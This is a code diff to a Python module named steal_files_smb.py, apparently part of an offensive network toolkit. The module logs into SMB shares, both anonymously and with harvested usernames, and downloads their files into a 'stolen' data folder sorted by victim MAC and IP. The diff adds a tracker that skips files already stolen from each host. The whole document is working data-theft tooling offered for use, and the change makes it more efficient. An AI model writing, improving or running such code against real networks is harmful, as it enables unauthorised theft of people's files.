@@ -7,6 +7,7 @@ from smb.SMBConnection import SMBConnection
 from smb.base import SharedFile
 from shared import SharedData
 from logger import Logger
+from actions.connector_utils import FileTracker
 
 # Configure the logger
 logger = Logger(name="steal_files_smb.py", level=logging.DEBUG)
@@ -29,6 +30,7 @@ class StealFilesSMB:
             self.shared_data = shared_data
             self.smb_connected = False
             self.stop_execution = False
+            self.file_tracker = FileTracker('smb', self.shared_data.datadir)
             logger.info("StealFilesSMB initialized")
         except Exception as e:
             logger.error(f"Error during initialization: {e}")
@@ -66,19 +68,31 @@ class StealFilesSMB:
             logger.error(f"Error accessing path {dir_path} in share {share_name}: {e}")
         return files
 
-    def steal_file(self, conn, share_name, remote_file, local_dir):
+    def steal_file(self, conn, share_name, remote_file, local_dir, ip):
         """
         Download a file from the SMB share to the local directory.
+        Optimization: Skip files that have already been downloaded.
         """
         try:
+            # Check if file was already stolen
+            file_path = f"{share_name}/{remote_file}"
+            if self.file_tracker.is_file_stolen(ip, file_path):
+                logger.debug(f"Skipping {file_path}: already stolen from {ip}")
+                return False
+            
             local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, '/'))
             local_file_dir = os.path.dirname(local_file_path)
             os.makedirs(local_file_dir, exist_ok=True)
             with open(local_file_path, 'wb') as f:
                 conn.retrieveFile(share_name, remote_file, f)
             logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
+            
+            # Mark file as stolen
+            self.file_tracker.mark_file_stolen(ip, file_path)
+            return True
         except Exception as e:
             logger.error(f"Error downloading file {remote_file} from share {share_name}: {e}")
+            return False
 
     def list_shares(self, conn):
         """
@@ -158,13 +172,29 @@ class StealFilesSMB:
                         mac = row['MAC Address']
                         local_dir = os.path.join(self.shared_data.datastolendir, f"smb/{mac}_{ip}/{share.name}")
                         if remote_files:
-                            for remote_file in remote_files:
+                            # Filter new files
+                            new_files, already_stolen_count = self.file_tracker.filter_new_files(
+                                ip, [f"{share.name}/{f}" for f in remote_files]
+                            )
+                            # Extract just the file paths
+                            new_file_paths = [f.split('/', 1)[1] if '/' in f else f for f in new_files]
+                            
+                            if already_stolen_count > 0:
+                                logger.info(f"Skipping {already_stolen_count} already stolen files from {share.name}, {len(new_file_paths)} new files")
+                            
+                            downloaded_count = 0
+                            for remote_file in new_file_paths:
                                 if self.stop_execution:
                                     break
-                                self.steal_file(conn, share.name, remote_file, local_dir)
-                            success = True
-                            countfiles = len(remote_files)
-                            logger.success(f"Successfully stolen {countfiles} files from {ip}:{port} via anonymous access")
+                                if self.steal_file(conn, share.name, remote_file, local_dir, ip):
+                                    downloaded_count += 1
+                            
+                            if downloaded_count > 0 or already_stolen_count > 0:
+                                success = True
+                                if downloaded_count > 0:
+                                    logger.success(f"Successfully stolen {downloaded_count} new files from {ip}:{port} via anonymous access")
+                                else:
+                                    logger.info(f"No new files from {ip} - all {already_stolen_count} files already stolen")
                     conn.close()
                     if success:
                         timer.cancel()  # Cancel the timer if the operation is successful
@@ -187,13 +217,29 @@ class StealFilesSMB:
                                 mac = row['MAC Address']
                                 local_dir = os.path.join(self.shared_data.datastolendir, f"smb/{mac}_{ip}/{share}")
                                 if remote_files:
-                                    for remote_file in remote_files:
+                                    # Filter new files
+                                    new_files, already_stolen_count = self.file_tracker.filter_new_files(
+                                        ip, [f"{share}/{f}" for f in remote_files]
+                                    )
+                                    # Extract just the file paths
+                                    new_file_paths = [f.split('/', 1)[1] if '/' in f else f for f in new_files]
+                                    
+                                    if already_stolen_count > 0:
+                                        logger.info(f"Skipping {already_stolen_count} already stolen files from {share}, {len(new_file_paths)} new files")
+                                    
+                                    downloaded_count = 0
+                                    for remote_file in new_file_paths:
                                         if self.stop_execution:
                                             break
-                                        self.steal_file(conn, share, remote_file, local_dir)
-                                    success = True
-                                    countfiles = len(remote_files)
-                                    logger.info(f"Successfully stolen {countfiles} files from {ip}:{port} on share '{share}' with user '{username}'")
+                                        if self.steal_file(conn, share, remote_file, local_dir, ip):
+                                            downloaded_count += 1
+                                    
+                                    if downloaded_count > 0 or already_stolen_count > 0:
+                                        success = True
+                                        if downloaded_count > 0:
+                                            logger.info(f"Successfully stolen {downloaded_count} new files from {ip}:{port} on share '{share}' with user '{username}'")
+                                        else:
+                                            logger.info(f"No new files from {ip} - all {already_stolen_count} files already stolen")
                                 conn.close()
                                 if success:
                                     timer.cancel()  # Cancel the timer if the operation is successful
